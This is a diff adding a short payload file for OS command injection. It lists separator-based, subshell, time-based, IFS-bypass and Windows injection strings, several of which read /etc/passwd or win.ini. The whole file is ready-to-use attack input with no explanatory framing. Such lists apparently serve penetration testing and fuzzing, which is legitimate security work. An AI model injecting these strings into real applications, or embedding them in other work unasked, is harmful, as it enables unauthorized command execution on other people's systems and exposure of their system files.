@@ -1,0 +1,39 @@
+# OS Command Injection Payloads
+
+# Basic Separators
+; id
+| id
+|| id
+& id
+&& id
+; whoami
+| whoami
+; ls -la
+
+# Subshell Execution
+$(id)
+`id`
+$(whoami)
+`whoami`
+$(cat /etc/passwd)
+
+# Time Based
+; sleep 5
+| sleep 5
+&& sleep 5
+|| sleep 5
+$(sleep 5)
+`sleep 5`
+; ping -c 5 127.0.0.1
+
+# IFS Bypass
+;${IFS}id
+$IFS$9id
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+
+# Windows
+& dir
+| dir
+&& dir
+| type C:\Windows\win.ini
